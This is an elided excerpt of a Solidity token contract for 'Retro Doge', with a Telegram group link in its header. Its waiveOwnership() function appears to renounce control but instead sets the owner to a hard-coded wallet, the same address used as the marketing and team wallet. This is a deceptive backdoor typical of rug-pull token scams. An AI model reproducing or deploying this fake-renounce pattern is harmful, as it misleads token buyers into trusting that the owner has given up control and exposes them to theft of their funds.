...
/**
Telegram : https://t.me/+SOF2BuER_aRiYmJk
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xB6c8BCaDbE7fc3A44A5De1404b252333Bee7e1e9);
    }
...
contract RetroDoge is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Retro Doge";
    string private _symbol = "RETRO DOGE";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xB6c8BCaDbE7fc3A44A5De1404b252333Bee7e1e9);
    address payable private teamWalletAddress = payable(0xB6c8BCaDbE7fc3A44A5De1404b252333Bee7e1e9);
